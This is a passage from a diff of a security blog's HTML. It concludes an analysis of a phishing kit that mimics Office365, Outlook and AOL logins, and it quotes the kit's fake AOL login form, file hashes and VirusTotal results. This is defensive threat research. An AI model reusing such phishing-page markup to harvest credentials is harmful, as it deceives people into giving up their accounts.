+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">form</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;needs-validation&#34;</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;post&#34;</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;&#34;</span> <span class="na">novalidate</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;form-group&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;Email&#34;</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;form-control&#34;</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;validationCustom01&#34;</span>
+</span></span><span class="line"><span class="cl">	    <span class="na">placeholder</span><span class="o">=</span><span class="s">&#34;Email&#34;</span> <span class="na">required</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;invalid-feedback&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">	    Enter Email Address
+</span></span><span class="line"><span class="cl">	<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;form-group&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;password&#34;</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;form-control&#34;</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;validationCustom02&#34;</span>
+</span></span><span class="line"><span class="cl">	    <span class="na">placeholder</span><span class="o">=</span><span class="s">&#34;Password&#34;</span> <span class="na">required</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;invalid-feedback&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">	    Enter Password
+</span></span><span class="line"><span class="cl">	<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;javascript:void(0);&#34;</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;forgotBtn&#34;</span><span class="p">&gt;</span>Forgot Password?<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">button</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;btn stepBtn&#34;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span><span class="p">&gt;</span>Go to step 2<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;get-user&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">&lt;</span><span class="nt">span</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;javascript:void(0);&#34;</span><span class="p">&gt;</span>Get a Free Username<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;javascript:void(0);&#34;</span><span class="p">&gt;</span>Erase Hard Drive Junk Now<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
 </span></span></code></pre></div><p>As for the other phishing pages of the kit, <code>emailcode/email.php</code> is imported also here. However, in this case, the <code>action</code> attribute of the form is empty; thus the php code will not be able to process the credentials of the victims.</p>
 <p>The file is clear according to VirusTotal:</p>
-<figure><img src="/images/posts/phishing-findings/ep1/vtaol.png"
-         alt="aol.php on VirusTotal"/><figcaption>
+<figure class="align-center ">
+    <img loading="lazy" src="/images/posts/phishing-findings/ep1/vtaol.png#center"
+         alt="VirusTotal findings for php file"/> <figcaption>
             <p>aol.php on VirusTotal</p>
         </figcaption>
 </figure>
 
-<h2 id="what-about-the-other-files">What about the other files?</h2>
+<h2 id="what-about-the-other-files">What about the other files?<a hidden class="anchor" aria-hidden="true" href="#what-about-the-other-files">#</a></h2>
 <p>We can check the VirusTotal detections of all the files using the sha256 hash:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ find . -type f | xargs sha256sum
-</span></span><span style="display:flex;"><span>e7ed36ceee5450b4243bbc35188afabdfb4280c7c57597001de0ed167299b01b  ./js/bootstrap.min.js
-</span></span><span style="display:flex;"><span>2777abe0312e6b49428d5d7f7f42e43af620793f86f823f2e045968afbdddb63  ./images/microbg.jpg
-</span></span><span style="display:flex;"><span>2ebc65a696544b8d69ade5f136250a9548d4badf1b9ad459e63ff68e7a985c69  ./images/mail.png
-</span></span><span style="display:flex;"><span>17f02fdb590800c9a21e2b6166f5f22cc54952d58897f09d8e82bb9195bc2071  ./images/outlook.png
-</span></span><span style="display:flex;"><span>089aa7fa65a4038b4ab9130d083e6bcc24b0e33f5018984ef1463b8516bc7993  ./images/microsoftlogo.png
-</span></span><span style="display:flex;"><span>e298d32d99708f56d68ef9cd0c44ec85910a4df7552b5b2041fcaa48d5ee9742  ./images/webmaillogo.png
-</span></span><span style="display:flex;"><span>efaccc2b190fcce0f0ab41064d882fb4a701c6aed6b1035595a16138e32a0a50  ./images/officelogo.png
-</span></span><span style="display:flex;"><span>6adc34b6d4d872e313e0857063eac568a489ab092ff0f15834a2559043c9c1e2  ./images/mobile-img.png
-</span></span><span style="display:flex;"><span>c86c4a6731077f1994a8caeccb1fc06477ea35a5b6abbb4abde1d06b8ef9ff32  ./images/landing-devices-bg.jpg
-</span></span><span style="display:flex;"><span>4603ea1b2f9df0c9d4f2a253c550ffbaf27ea2cb53ecde4277b2acf9dde33979  ./images/Onedrive-logo.png
-</span></span><span style="display:flex;"><span>1500514adf9e666a3d20530815df881bc94812c6906a53bd4c216d051d18c372  ./images/office.png
-</span></span><span style="display:flex;"><span>7a2c0b0e1e16041b12dd1a7d18438ceb14063c980799baee1d55cb2f04892777  ./images/officebg.jpg
-</span></span><span style="display:flex;"><span>84f1d1ffdc036768ffeba1be92362dcf619e7ce6ec27500ab47844ed24fc4230  ./index.php
-</span></span><span style="display:flex;"><span>0b09beb179bd176c93c443175940777332cf57ac9e4487ea9088ae21e3c6d032  ./microsoft.php
-</span></span><span style="display:flex;"><span>8979f584623e4307a42bd008d755c35456af8cb96bec89dd4fbec47036e20184  ./css/style.css
-</span></span><span style="display:flex;"><span>2c0f3dcfe93d7e380c290fe4ab838ed8cadff1596d62697f5444be460d1f876d  ./css/bootstrap.min.css
-</span></span><span style="display:flex;"><span>c60bd69cdc08032d32898d4d3f7648a5370f15720b58b51af77a4ecd72799bc3  ./webmail.php
-</span></span><span style="display:flex;"><span>e5a35da055cf9b0cf6d4cfbd2d0e8be75ebdc56949740c5e767f12915e6174eb  ./office.php
-</span></span><span style="display:flex;"><span>085f5dfb1f89bd983c58e618a95bf7bdaa872bee4a126495ec3e7cf421bb9fc2  ./aol.php
-</span></span><span style="display:flex;"><span>3234d6c03d185864d6537178a4d1e44c5277c9115f11b07f9c5be0517ebc51a7  ./emailcode/email.php
-</span></span><span style="display:flex;"><span>d6083dcb3385f93916f63b6e50d28791a51842d38bd507bcad7b731b7b33009d  ./outlookcode/email.php
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ find . -type f <span class="p">|</span> xargs sha256sum
+</span></span><span class="line"><span class="cl">e7ed36ceee5450b4243bbc35188afabdfb4280c7c57597001de0ed167299b01b  ./js/bootstrap.min.js
+</span></span><span class="line"><span class="cl">2777abe0312e6b49428d5d7f7f42e43af620793f86f823f2e045968afbdddb63  ./images/microbg.jpg
+</span></span><span class="line"><span class="cl">2ebc65a696544b8d69ade5f136250a9548d4badf1b9ad459e63ff68e7a985c69  ./images/mail.png
+</span></span><span class="line"><span class="cl">17f02fdb590800c9a21e2b6166f5f22cc54952d58897f09d8e82bb9195bc2071  ./images/outlook.png
+</span></span><span class="line"><span class="cl">089aa7fa65a4038b4ab9130d083e6bcc24b0e33f5018984ef1463b8516bc7993  ./images/microsoftlogo.png
+</span></span><span class="line"><span class="cl">e298d32d99708f56d68ef9cd0c44ec85910a4df7552b5b2041fcaa48d5ee9742  ./images/webmaillogo.png
+</span></span><span class="line"><span class="cl">efaccc2b190fcce0f0ab41064d882fb4a701c6aed6b1035595a16138e32a0a50  ./images/officelogo.png
+</span></span><span class="line"><span class="cl">6adc34b6d4d872e313e0857063eac568a489ab092ff0f15834a2559043c9c1e2  ./images/mobile-img.png
+</span></span><span class="line"><span class="cl">c86c4a6731077f1994a8caeccb1fc06477ea35a5b6abbb4abde1d06b8ef9ff32  ./images/landing-devices-bg.jpg
+</span></span><span class="line"><span class="cl">4603ea1b2f9df0c9d4f2a253c550ffbaf27ea2cb53ecde4277b2acf9dde33979  ./images/Onedrive-logo.png
+</span></span><span class="line"><span class="cl">1500514adf9e666a3d20530815df881bc94812c6906a53bd4c216d051d18c372  ./images/office.png
+</span></span><span class="line"><span class="cl">7a2c0b0e1e16041b12dd1a7d18438ceb14063c980799baee1d55cb2f04892777  ./images/officebg.jpg
+</span></span><span class="line"><span class="cl">84f1d1ffdc036768ffeba1be92362dcf619e7ce6ec27500ab47844ed24fc4230  ./index.php
+</span></span><span class="line"><span class="cl">0b09beb179bd176c93c443175940777332cf57ac9e4487ea9088ae21e3c6d032  ./microsoft.php
+</span></span><span class="line"><span class="cl">8979f584623e4307a42bd008d755c35456af8cb96bec89dd4fbec47036e20184  ./css/style.css
+</span></span><span class="line"><span class="cl">2c0f3dcfe93d7e380c290fe4ab838ed8cadff1596d62697f5444be460d1f876d  ./css/bootstrap.min.css
+</span></span><span class="line"><span class="cl">c60bd69cdc08032d32898d4d3f7648a5370f15720b58b51af77a4ecd72799bc3  ./webmail.php
+</span></span><span class="line"><span class="cl">e5a35da055cf9b0cf6d4cfbd2d0e8be75ebdc56949740c5e767f12915e6174eb  ./office.php
+</span></span><span class="line"><span class="cl">085f5dfb1f89bd983c58e618a95bf7bdaa872bee4a126495ec3e7cf421bb9fc2  ./aol.php
+</span></span><span class="line"><span class="cl">3234d6c03d185864d6537178a4d1e44c5277c9115f11b07f9c5be0517ebc51a7  ./emailcode/email.php
+</span></span><span class="line"><span class="cl">d6083dcb3385f93916f63b6e50d28791a51842d38bd507bcad7b731b7b33009d  ./outlookcode/email.php
 </span></span></code></pre></div><p>Here are the detections of <code>index.php</code>, <code>microsoft.php</code>, <code>office.php</code> and <code>webmail.php</code> on VirusTotal as of today.</p>
-<figure><img src="/images/posts/phishing-findings/ep1/vtall.png"
-         alt="index.php, microsoft.php, office.php and webmail.php on VirusTotal"/><figcaption>
+<figure class="align-center ">
+    <img loading="lazy" src="/images/posts/phishing-findings/ep1/vtall.png#center"
+         alt="Virustotal findings for the php files"/> <figcaption>
             <p>index.php, microsoft.php, office.php and webmail.php on VirusTotal</p>
         </figcaption>
 </figure>
 
 <p>No matches were found for <code>emailcode/email.php</code> and <code>outlookcode/email.php</code>. All the other files were flagged as &lsquo;<em>Undetected</em>&rsquo; by all the engines on VirusTotal.</p>
-<h2 id="conclusion">Conclusion</h2>
+<h2 id="conclusion">Conclusion<a hidden class="anchor" aria-hidden="true" href="#conclusion">#</a></h2>
 <p>In this post, we analyzed <code>u.zip</code>, a phishing kit found online which tricks victims into giving their credentials using 3 templates: one for Office365, one for Outlook and one for other email services (with a cPanel theme).</p>
-<figure><img src="/images/posts/phishing-findings/ep1/diagram.png"
-         alt="Schema of the phishing kit"/><figcaption>
+<figure class="align-center ">
+    <img loading="lazy" src="/images/posts/phishing-findings/ep1/diagram.png#center"
+         alt="schema of the phishing kit"/> <figcaption>
             <p>Schema of the phishing kit</p>
         </figcaption>
 </figure>
 
 <p>The templates redirect the credentials to <code>emailcode/email.php</code>, which tries to gather additional information and writes them into an email, that is sent to the exfiltration email address. At the end of the execution, the victim is redirected to <code>login.microsoftonline.com</code>.</p>
 
-      </div>
 
+  </div>
 
-      <footer>
-        
-
-
-        
-        
-        
-      </footer>
-    </article>
-
-    <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
-  <script type="text/javascript" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/startup.js" id="MathJax-script"></script>
-  <script>
-    MathJax = {
-      tex: {
-        inlineMath: [
-          ['$', '$'], ['\\(', '\\)']
-        ],
-        processEscapes: true,
-        processEnvironments: true
-      },
-      options: {
-        skipHtmlTags: ['script', 'noscript', 'style', 'textarea', 'pre']
-      }
-    };
-  </script>
-  </section>
-
-	      </div>
-
-	<footer class="footer">
-
-<hr>
-
-    <section class="container">
-	
-	<p>If you have comments or suggestions, feel free to ping me!</p>
-	
-	
-	
-	
-
-
-<ul>
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://andpalmier.com/tags/phishing/">phishing</a></li>
+      <li><a href="https://andpalmier.com/tags/phishingkit/">phishingkit</a></li>
+      <li><a href="https://andpalmier.com/tags/outlook/">outlook</a></li>
+      <li><a href="https://andpalmier.com/tags/office365/">office365</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
     
-    
-    <li>
-	<a href="https://twitter.com/andpalmier/" aria-label="Twitter"  target="_blank" >
-	    <i class="fab fa-twitter" aria-hidden="true"></i>
-	</a>
-    </li>
-    
-    
-    
-    <li>
-	<a href="https://infosec.exchange/@andpalmier/" aria-label="Mastodon"  target="_blank" >
-	    <i class="fab fa-mastodon" aria-hidden="true"></i>
-	</a>
-    </li>
-    
-    
-    
-    <li>
-	<a href="https://github.com/andpalmier/" aria-label="Github"  target="_blank" >
-	    <i class="fab fa-github" aria-hidden="true"></i>
-	</a>
-    </li>
-    
-    
-    
-    <li>
-	<a href="https://www.linkedin.com/in/andpalmier/" aria-label="LinkedIn"  target="_blank" >
-	    <i class="fab fa-linkedin" aria-hidden="true"></i>
-	</a>
-    </li>
-    
-    
-    
-    <li>
-	<a href="mailto:andpalmier@gmail.com" aria-label="Mail"  target="_blank" >
-	    <i class="fas fa-envelope" aria-hidden="true"></i>
-	</a>
-    </li>
-    
-    
-    
-</ul>
-
-    </section>
+<footer class="footer">
+    <span>&copy; 2022 <a href="https://andpalmier.com">andpalmier</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
 </footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a><script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.6/medium-zoom.min.js" integrity="sha512-N9IJRoc3LaP3NDoiGkcPa4gG94kapGpaA5Zq9/Dr04uf5TbLFU5q0o8AbRhLKUUlp8QFS2u7S+Yti0U7QtuZvQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+<script>
+const images = Array.from(document.querySelectorAll(".post-content img"));
+images.forEach(img => {
+  mediumZoom(img, {
+    margin: 0,  
+    scrollOffset: 40,  
+    container: null,  
+    template: null,  
+    background: 'rgba(0, 0, 0, 0.8)'
+  });
+});
+</script>
 
 
-	  </main>
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
 
-    
-      
-        
-        <script src="/js/dark-mode.min.c2d8a1f8f2660e4a46d776277c72695a1e0ca65939d79f754441d47551604af5.js"></script>
-      
-    
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
 
-	  
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
 
-	  
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
 
-	  
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
 
-    </body>
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
 
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
 
 </html>
